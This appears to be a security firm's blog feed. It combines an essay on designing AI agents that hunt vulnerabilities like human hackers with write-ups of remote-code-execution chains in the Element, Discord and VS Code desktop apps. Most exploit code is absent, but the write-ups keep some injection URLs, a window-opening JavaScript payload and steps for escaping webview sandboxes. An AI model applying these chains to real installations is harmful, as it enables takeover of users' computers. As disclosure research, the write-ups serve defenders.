item.title: How to Make AI Hack like a Human
item.description: Why does hacking feel like magic? How human hackers think, and how we can design AI agents to find bugs in complex systems the way top security researchers do.
item.content:encoded:
Magic, or just a lack of understanding

“What magical trick makes us intelligent? The trick is that there is no trick. The power of intelligence stems from our vast diversity, not from any single, perfect principle.”

Marvin Minsky, The Society of Mind, p. 308

When a magician pulls birds out of thin air, makes objects vanish, or turns one card into another, we are often left in awe and confusion. Some tricks are so mind-bending that the magician almost seems to have supernatural powers.

Behind the scenes, though, magicians rely on tricks like exploiting human psychology, misdirection, and optical illusions. In the moment, it truly feels magical, but once the trick is revealed, everything makes sense and it suddenly seems obvious.

Similarly, many of the things we do intellectually, such as hacking software, composing music, and generating new ideas, can seem like magic at first. That points to a gap in our understanding of how the brain works, and scientific inquiry can often bridge it.

The old philosophical riddle about whether a tree falling in a forest with no one to hear it makes a sound stops being a mystery once we understand sound as vibrating air waves.

The same applies to consciousness and creativity. They may feel magical now, but I expect that with time the mystery will dissolve.

Intelligence, by contrast, already has several hypotheses explaining how it works. There’s no complete theory of every part yet, but current cognitive science and neuroscience suggest that it is modular, distributed, hierarchical, and predictive, emerging from the interaction of systems like perception, memory, decision making, learning, and attention.

Marvin Minsky’s Society of Mind is one theory that is particularly useful for building AI agents, and it fits both cognitive science and modern artificial intelligence surprisingly well.

Minsky proposed that intelligent behavior can be broken down into simple components, or “agents,” that each handle a narrow task. These agents interact and cooperate in hierarchical structures to produce intelligence.

Even if Minsky’s framework isn’t entirely accurate about how real minds work, IMO treating hacking as the work of a specialized sub-agent, and narrowing down what that agent does, is still useful for building more effective, targeted agents.

The hacking agent in my brain

When I am not hacking, I find great joy reading psychology, philosophy, and the study of consciousness, intelligence, and creativity. Exploring these questions has always made me feel more alive. AI made this even more exciting, because I can now explore hacking and intelligence together by building hacking agents.

For any given task, the frame of agency changes, and the agent has to change with it. A “coding agent” operates completely differently from a “hacking agent.” The goals and strategies are different, so each agent needs its own hierarchy and heuristics for approaching the goal. (Switching between the coding agent frame and the hacking agent frame could be the sole reason for many software security issues.)

To develop a hacking agent, I first need to understand how the hacking agent in my own brain works, and how it generally operates for top-tier hackers. Only by understanding that process can I begin to transfer it into an AI agent.

Formalizing hacking and the science of insecurity

“Exploitation is setting up, instantiating and programming a weird machine.”

Halvar Flake

To create capable AI hacking agents, we must approach insecurity from first principles. In my view, the root of insecurity is not negligence but the cognitive limitations of humans: our difficulty reasoning about trust in deeply composable software systems, and the overwhelming complexity of software state machines.

A hacker’s job is to understand that complexity at many levels, understand it better than the original author, and break the assumptions holding the system together.

At a fundamental level, software systems are finite state machines. Each instruction or input transitions the system from one state to another. And we use Turing-complete languages to implement these state transitions in real-world code.

Take a simple login system, for example. Its high-level state path might look like this (of course, each of these states may include their own internal substates and branching logic):

A programmer’s task is to write such state machines, embedding the logic that governs how transitions occur. That logic is the decision-making layer that controls state transitions, and Turing-complete languages give programmers the expressive power to encode it, for browsers, web apps, protocols, and beyond.

“In a more pragmatic way, we can describe information security as the work towards computer systems we can finally trust.”

Jörn Bratzke

In a perfect world, programs would do exactly what they were designed to do, and there would be no malicious actors to tamper with them or coerce them into weird machines. Security would be unnecessary and trust would be implicit. We don’t live in that world, which is why we need hackers to create trusted systems before criminals exploit them.

Note

A tangent on trust and coercion

Just as a society without enforced property rights invites chaos and looting, software systems without trust enforcement invite exploitation. In many parts of the world, the absence of legal trust and secure ownership structures leads to poverty even where people have resources, because they cannot trust the system to protect them. The rational way to survive in this situation is to cheat.

Trust requires coercion. In the real world, the rule of law and the threat of consequences force people to cooperate and create the conditions for prosperity.

A similar dynamic plays out in software engineering. Teaching every developer to write secure code is a losing battle. Google chose control over education, as its secure-by-design blueprint for a high-assurance web framework describes. Instead of hoping developers remember secure practices, Google enforced trust by design: hardened frameworks, default-safe libraries, and architectural constraints that coerce developers into writing secure code.

“Any complex execution environment is actually many: One intended machine, endless weird machines.”

Sergey Bratus

A hacker’s job is to explore a system more deeply than the person who built it, understanding it at multiple levels, mentally reconstructing its state machine, and breaking its logical assumptions.

Limits of security and the danger of AI

Even world-class hackers are bound by cognitive limits. We can’t reason about all possible states, branches, and interactions in composable, dynamic systems.

If we ever witness an intelligence explosion (AI systems that can reason far beyond human cognitive limits), it’s likely they will discover more weird machines than we ever could. Exploits that are invisible to the human mind may become trivial for them, so such AI capabilities must not fall into the hands of malicious actors.

Even so, superintelligent AI would face hard theoretical limits on achieving perfect security (Rice’s theorem).

Vulnerability discovery as theorem proving

At a high level, vulnerability discovery is a logical problem. The goal of a hacker, or of a security reasoning system, is to construct a proof that a program’s behavior can violate its specification or assumptions. This can be done by guessing or brute-forcing, but it usually happens by systematically identifying a logical inconsistency in the system’s structure.

This idea is grounded in the Curry–Howard correspondence, which draws a direct parallel between computation and logic. Programs are proofs, and proofs are programs. Running a program is akin to constructing a logical argument. By extension, vulnerabilities are proofs too. They arise when a hacker constructs a logical path (i.e., an exploit) that demonstrates a proposition such as “the user input reaches a certain sink.”

In this view, vulnerability hunting, whether by humans or by AI agents, is adversarial theorem proving, where the proposition to be proven is:

Given a system with a certain structure, can an input exist that causes unintended behavior?

That unintended behavior might look like:

  • Can untrusted input reach a dangerous sink?
  • Can the attacker elevate privileges?
  • Can this sequence of states bypass assumptions?

These are all questions about the semantic properties of programs (their meaning, not only their syntax or structure). That said, most of the vulnerabilities developers introduce in web applications are syntactic issues that current AI agents or SAST tools can easily find.

But what separates top-tier human researchers is their ability to reason about semantic vulnerabilities: issues that emerge from deep interactions across various systems, state transitions, and multi-layer logic.

Not all humans think alike

For me, the difference in hacking ability between people becomes especially clear in CTF competitions, where some of my friends process complex systems and identify vulnerabilities remarkably fast. In my opinion, this isn’t always something you can learn through practice alone. I’ve seen newcomers, people with almost no background in hacking, rapidly outpace others simply because of how quickly they digest information and reason.

This suggests that effective vulnerability discovery in complex targets requires a particular mix of cognitive abilities, which I’d generalize into three:

  1. Long-term memory stores and recalls core concepts, prior vulnerabilities, bug classes, system behaviors, and high-level heuristics. This enables variant analysis and generalization.
  2. Working memory is a mental “scratchpad” that actively holds and manipulates details of the current subsystem or bug candidate. The larger the working memory, the more state and logic one can juggle simultaneously.
  3. Processing information is the engine behind reasoning. It allows the hacker to simulate hypotheses, test edge cases, and compress raw inputs into abstract representations. Even with strong memory, slow processing yields weak results. Conversely, high processing speed enables rapid internal updates and better state manipulation. I also think good processing helps store information well in long-term and working memory.

One aspect of memory is particularly relevant for AI agents. Even top-tier human hackers never ingest full codebases into working memory. Instead, they construct and rely on specific abstract representations, some kind of control-flow skeleton. These abstractions allow them to compress vast complexity into something they can actually reason about.

One of the areas I’m actively researching is how to replicate this ability in AI agents, by extracting the right abstractions from large codebases, storing them meaningfully, and performing targeted reasoning over them to find vulnerabilities.

Two modes of vulnerability discovery

Known propositions (variant analysis)

This is the majority of modern vulnerability discovery: looking for known bug classes, such as SQL injection, SSRF, XSS, and authn and authz issues, in new code. Rather than inventing new propositions, you’re just proving them in a new context.

This form of analysis is currently the primary focus of Formant, and it accounts for 60–70% of real-world web application vulnerabilities. The search starts with a known vulnerability class, retrieves its defining characteristics and exploitation patterns, and then systematically processes the target codebase to determine whether that pattern exists. Realistically, we expect to solve this at Formant if everything works out.

However, variant analysis in complex systems like V8 is much harder. These bugs often depend on deep contextual understanding of specific subsystems.

Novel propositions (new research)

Novel research, in contrast, involves generating new propositions based on a deep understanding of system behavior. These are often semantic, logic, or design-level bugs, and they require:

  • A thorough understanding of the subsystem, which itself demands significant processing power to reason through complex architectures.
  • Creative capacity to hypothesize how things might go wrong and break the trust.
  • Sufficient computational bandwidth (mental or machine) to simulate those hypotheses and explore potential weird states.

This is what I aspire to solve at Formant, because I’m not great at this myself. I’m envious (in a good way) of people who can dive into V8 internals or kernel subsystems and find deep, structural flaws. So instead of trying to become one of them, I want to build something that comes out of me, an AI system that can do that.

Case study: hacking V8 via WASM

A CTF teammate of mine once hacked V8’s WASM type system and landed a full exploit chain within just three days. That’s one of the wildest things I’ve ever seen pulled off.

Here’s my rough (and probably naive) understanding of how he did it:

First he had to understand the system, the job of the understanding agent. He didn’t start with deep knowledge of V8’s WASM internals, but he had strong fundamentals in type systems, compilers, and how computers work at a low level. From there, he dove into WASM specs, RFCs, and blog posts. Even parsing and internalizing those large specifications in a day or two requires what feels like superhuman processing speed.

With that kind of cognitive throughput, you can build efficient internal representations of complex systems. Some people have this ability, not to memorize everything but to mentally structure complexity so that reasoning about it feels almost intuitive. Once he understood the core concepts, like WASM’s isorecursive type system, he built a compressed internal model of it, and this could happen in parallel. It probably wasn’t the full source code in his head but something abstract, maybe a control-flow diagram or a conceptual graph of how types are resolved and passed through the engine. The quality of that representation, how well its structure captures essential behavior, matters more than raw memory.

Then he had to manipulate the system, the job of the reasoning agent. This is where the hacker mindset agent comes in, and the frame has to change to simulating what could go wrong. What happens if a type check fails? What happens if an optimization assumes something that turns out to be false? He ran these “what-if” computations mentally, probing the gap between the type system as designed and as implemented. That’s where vulnerabilities live.

Even V8 developers might not have this kind of adversarial model in mind, because they’re focused on building, not breaking. A hacker has the freedom to focus purely on failure, and whatever assumptions the system was built on become targets.

Why this matters for Formant

You don’t need to load the full codebase to find deep bugs. An agent needs to:

  • Navigate and isolate a subsystem
  • Build an internal model or abstraction of how it works
  • Simulate hypotheses and see what breaks
  • Compress that insight and hand it off to a vulnerability-finding agent

That’s how humans do it, and maybe AI should be modeled the same way. I think this is how AI will eventually hack large, complex systems like V8, and it’s what we’re trying to build.

Introduction

November 30, 2021
Pew11/30/2021

@s1r1us I actually just spent 30 minutes looking at this and found a external content injection through

element://vector/webapp/jitsi.html?parentUrl=https://parent&conferenceDomain=www.google.com&conferenceId=xxd&userId=pew
s1r1us11/30/2021

whats element
Pew11/30/2021

s1r1us11/30/2021

oh, looks like we already have an RCE there 😸

During our Electron desktop application hacking frenzy, Pew told me on Discord about a desktop application called Element where he could insert an external iframe. We began examining the public Element Desktop source and eventually got remote code execution (RCE).

Bug 1: iframe injection

This is a feature, rather than a bug. Element supports Jitsi for conference calls, which provides options for self-hosting your own server. According to its documentation, the conferenceDomain query parameter can be provided to embed a self-hosting conference server. The documentation also mentions that “The URL is typically something we shove into an iframe with ‘sandboxing’”. Since it was “sandboxed” it won’t be an issue, right? Right?

Here is the PoC for the web application. The following URL can be used to embed an external site named pwn.af:

https://app.element.io/jitsi.html?conferenceDomain=pwn.af&conferenceId=xxd&userId=pew

Here is the desktop application PoC:

element://vector/webapp/jitsi.html?conferenceDomain=pwn.af&conferenceId=xxd&userId=pew

By using the above PoC, we can get JavaScript execution on the desktop app. The issue, however, is that the Element Desktop application fully enables sandboxing. As you can notice in the below script, sandboxing is enabled via app.enableSandbox(). Also note that nodeIntegrationInSubFrames is disabled by default:

This situation is different from the previous Discord bug where sandboxing was not fully enabled.

There are a few things we can look for if sandboxing is disabled on the main window:

  1. Check if there are any new-window or navigation misconfigurations similar to the Discord bug.
  2. Check if there are any postMessage issues on the main frame.
  3. Find an XSS on the subdomain of the parent window (app.element.io) to perform same-origin spoofing (similar to the BSides Ahmedabad CTF challenge I gave).
  4. Finally, we can look for sensitive ipcMain handlers on the main window, which can be reached through CVE-2022-29247 (which we reported to Electron).

Now, the only option we have is option 4, as the app is fully sandboxed. To get RCE from option 4, we need a sensitive ipcMain handler on the main window.

Bug 2: finding RCE sinks on the desktop app

After grepping for ipcMain.on and ipcMain.handle, we came across an interesting IPC handler that opens user-downloaded files, defined in src/webcontents-handler.ts:

And this is exposed to the main window’s parent frame using the preload script’s contextBridge as below:

So, by sending the following IPC from the main frame, we achieve RCE:

Now, let’s consider our options on how to get access to electron.send from the iframe which we have XSS on.

  1. Get an XSS on the main window and access electron.send directly.
  2. Use CVE-2022-29247’s nodeIntegrationInSubFrames and get access to electron.send in our iframe.

We audited the main window’s JavaScript for XSS sinks, but we couldn’t find anything interesting. So, we decided to use the second option, which seems to be easily achieved as the Element Desktop is using an old version of Electron, 13.5.1. Its user agent string is Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Element/1.9.5 Chrome/91.0.4472.164 Electron/13.5.1 Safari/537.36.

What nodeIntegrationInSubFrames does

Electron’s documentation defines the nodeIntegrationInSubFrames webPreference as follows:

“nodeIntegrationInSubFrames: Experimental option for enabling Node.js support in sub-frames such as iframes and child windows. All your preloads will load for every iframe, you can use process.isMainFrame to determine if you are in the main frame or not.”

nodeIntegrationInSubFrames enables preloads in iframes, which exposes the contextBridge APIs to iframes and child windows. That is what we needed to reach electron.send, which the Element Desktop main window’s preload script exposes.

The situation we have can be described with the below picture:

As you can see our frame doesn’t have access to the electron.send API.

Bug 3: renderer exploit to enable nodeIntegrationInSubFrames (CVE-2022-29247)

Electron adds Electron-specific WebPreferences such as node_integration, context_isolation and node_integration_in_sub_frames by patching the Blink WebPreferences:

These preferences are then later used to check if the specific RenderFrame (a web frame) has access to Electron specific features, such as Node APIs, preload scripts, contextBridge, etc. Let’s just concentrate on node_integration_in_sub_frames, which is needed for our Element RCE.

Electron decides whether to allow preloads in child frames (RenderFrames) in ElectronSandboxedRendererClient::DidCreateScriptContext, which runs in the renderer process, not the browser process:

As the check is done in the renderer process, using a renderer exploit the setting can be flipped which effectively enables nodeIntegrationInSubFrames.

The only thing which is left is to write an exploit which flips the render_frame->GetBlinkPreferences().node_integration_in_sub_frames somehow, which is the hardest part for me.

Using a V8 exploit (CVE-2021-37975)

I decided to use CVE-2021-37975 to exploit the issue. Having not so much experience in exploit development, this was the most tiring yet most interesting part for me. Fun fact, I didn’t know nothing about V8 binary exploitation before our research, and somehow was able to learn basic V8 exploitation thanks to my CTF mate ptr-yudai.

Even though we usually use a public V8 exploit, it’s not as easy as running it and popping the calculator. The hardest part I faced during the exploit writing was finding the render_frame_ offset from the window object, as it was usually not stable because of naive usage of hardcoded offsets. I spent days in lldb to understand the V8 bug and find offsets to Blink WebPreferences, but popping the calculator in the end made it worth doing.

Anywho, after trying for 2 days I was able to pull off a full exploit. The following snippet reveals the offset to render_frame->GetBlinkPreferences().node_integration_in_sub_frames. You can find the full exploit at the end of the writeup:

Note

Want to secure your Electron or JavaScript application? Reach out to us at hello@hacktron.ai or visit hacktron.ai to learn more.

Background and how Electrovolt started

During our prototype pollution research, BlackFan reported an XSS to a bug bounty program. The XSS report wasn’t getting much attention and had been in a triaged state for two months with no response. The program scope included a desktop application as well, which made me curious if I could exploit this to get RCE on the desktop app. Although the desktop app was not Electron-based, I was still able to achieve RCE with ptrYudai’s help. The program noticed our escalation to RCE and immediately fixed the issue and paid out a nice bounty. With such results, I decided to start focusing on hacking desktop applications.

Targeting Discord desktop

Obviously, I decided to target the Discord desktop application because it was being used for our Prototype Pollution research collaboration. Discord uses ElectronJS for their desktop application, and to be honest, I didn’t really know much about ElectronJS at that time. However, I thought it was just a JavaScript application and started learning and hacking. The interesting thing about ElectronJS applications is that you can extract the JavaScript used to build the application using the command below. The one thing I always love to do is source code auditing. It makes things easier than black-box testing. When it comes to JavaScript hacking, most of the time you can get the source code, whether it’s a web application frontend or JS-based desktop applications:

After extracting, I realized that it would not be easy to achieve remote code execution using the usual Electron misconfigurations because, as we can see, nodeIntegration is disabled and contextIsolation is enabled. Masato previously compromised Discord when contextIsolation was disabled. You can read more about it in his blog, which is also an excellent primer for working on ElectronJS applications. Here is the webPreferences configuration:

So far, the webPreferences configuration looks secure based on previous RCEs targeting Electron applications. However, there is one important webPreference missing: the sandbox flag. If sandbox is not set to true, the app runs without sandboxing by default. I also checked the Electron version, which was 9-x-y using the relatively old Chromium Chrome/83.0.4103.122. It became apparent that achieving RCE with that version of Chrome would not be particularly difficult, as there were quite a few V8 bugs available in the Chromium patches.

XSS discovery in Discord embeds

I decided to find XSS on Discord Desktop. Since the Discord frontend uses ReactJS, after a few days I realized that finding XSS on the main Discord app was challenging, and there were no interesting ReactJS sinks as far as I could see. Taking inspiration from Masato’s blog, I started looking for XSS on Discord embeds.

Vimeo XSS and CSP bypass

While I was trying to find XSS on Discord embeds, I worked with Harsh Jaiswal (@rootxharsh) to find an XSS in Discord embeds. After some work, we managed to get an XSS on one of the Vimeo endpoints. However, due to Vimeo’s CSP implementation, I had difficulties executing an external script to trigger the exploit. I faced issues loading an external script and running the exploit because of the CSP. The Vimeo endpoint had the following CSP:

Since the Discord Chrome version was old, I decided to use a CSP bypass I had previously read about on crbug.com. This allowed me to load an external iframe in the Vimeo embed by bypassing the frame-src restriction.

By hosting the following HTML and sharing the link in a Discord chat, an alert box would pop up in the Vimeo embed:

Sandbox bypass via new-window

I was excited to run the V8 exploit in the Vimeo embed and pop the calculator, but there was a catch: all the iframes in the Discord Desktop Application were running in sandbox mode. Apparently, Electron enables sandboxing by default for all embeds. At first, I thought this was the end of the story.

While I was discussing this issue in the Discord channel, Masato pointed out that it was possible to open a new window due to insufficient restrictions on the new-window event in Discord:

July 9, 2021
masatokinugawa07/09/2021

@s1r1us If you execute the following code on the iframe of the inline embeds and click on the displayed button, you can open arbitrary URL on the electron window

document.body.innerHTML="<button onclick=window.open('https://discord.com/popout','DISCORD_foo').location='https://example.com/'>CLICK"

that window might not have the sandbox
s1r1us07/09/2021

it has one :/

Unfortunately, even after opening the exploit in a new window, the sandbox was still enabled. I wasn’t sure why, but after some time, I realized that redirecting to a different origin would clear the sandbox. Perhaps the renderer process of the Vimeo embed was reused for the new window, and after the redirect, a new process was created without sandboxing.

V8 exploit

At that time, I wasn’t very experienced at writing V8 exploits, so I asked my CTF friend ptrYudai to help me write one using crbug.com/1196683. After a few trials and errors, we finally managed to pop the calculator.

Proof of concept

Here is the PoC that pops the calculator:

Watch the Discord Desktop proof of concept on YouTube

Remediation

Discord upgraded their Electron version to the latest and fixed the misconfiguration in the new-window event handler by preventing external sites from being loaded in new windows.

item.title: RCE in VS Code Restricted Mode
item.description: How we achieved remote code execution in Visual Studio Code’s Restricted Mode by chaining origin leaks, CSP bypasses, and webview message handler flaws.
item.content:encoded:
Note

To discuss security work on an Electron or JavaScript application, contact hello@hacktron.ai or visit hacktron.ai.

VSCode is a widely used Electron application. As part of our research into hacking Electron apps, we tried to exploit it and achieved remote code execution.

Summary

Remote code execution can be achieved if a victim opens a markdown file in a maliciously crafted VSCode project or folder, even when running in VSCode’s Restricted Mode.

VSCode webview origin leak and meta redirect

Markdown files are rendered using the vscode-webview:// protocol with a unique ID, and the rendered page has the following CSP:

Achieving XSS is impossible unless we can somehow leak the nonce. However, vscode-webview:// includes a postMessage handler that can be exploited for XSS. To use this postMessage, we first need to leak the extension ID, which is the host part of the vscode-webview:// origin.

Origin leak

Since the markdown is rendered in the same origin, we can use a technique like HTTPLeaks to leak the origin.

We discovered that it is possible to leak the extension ID via the font-src CSS directive, as the origin header in the request contains the ID we need:

Meta redirect

Even with such a strict CSP, we can still use a meta tag to redirect to an attacker’s site where JavaScript can be executed.

Here is a proof of concept for the meta redirect and ID leak:

XSS in vscode-webview

vscode-webview:// pages have postMessage handlers. They check if the message is coming from a valid origin by using a query parameter named parentOrigin. This means that any arbitrary origin can load the vscode-webview in an iframe and send postMessage calls:

On the attacker’s page, we can create an iframe with the following origin:

After that, we can send the following postMessage to achieve XSS in vscode-webview:

For reference, see src/vs/workbench/contrib/webview/browser/pre/main.js#L762.

XSS in vscode-file origin

vscode-file is the main origin used by VSCode, and it has nodeIntegration enabled. It is similar to the file:// origin, allowing you to load files by their path, but only if they are inside the VSCode installation directory.

The following path shows where VSCode runs, which is within the installation directory:

Our idea was to navigate vscode-file:// to a controlled HTML file to demonstrate that we could run Node.js code and achieve RCE. However, navigation is restricted to the installation path, and we can’t create arbitrary files within that directory. We considered using network shares, but that approach didn’t work.

After some experimentation, we discovered that by using path traversal, we could load any file outside of the VSCode installation path:

Now we need a way to create an arbitrary HTML file on the victim’s computer.

Our idea was to use the same VSCode project or folder to store the HTML file. Then, we could navigate to it using top.location='vscode-file://vscode-app/vscode_project_opened_folder_path/malicious.html':

That puts an arbitrary HTML file in the VSCode project folder on the victim’s computer, but we still need its path. A postMessage leak provides it.

To leak the current user’s directory path, vscode-webview:// can send postMessage calls to the vscode-file:// origin. When a channel: do-reload postMessage is sent to vscode-file, it responds with several postMessage calls back to vscode-webview://, and one of these messages reveals the user’s directory path:

After obtaining the user’s directory path, we can redirect the current window to vscode-file:///:

Here is a full proof of concept for vscode-webview XSS and vscode-file XSS:

Reducing user interaction

To render a markdown file, users typically need to select Markdown: Open preview in Quick Open. However, by using a VSCode workspace settings file, we can automatically render markdown without any user interaction:
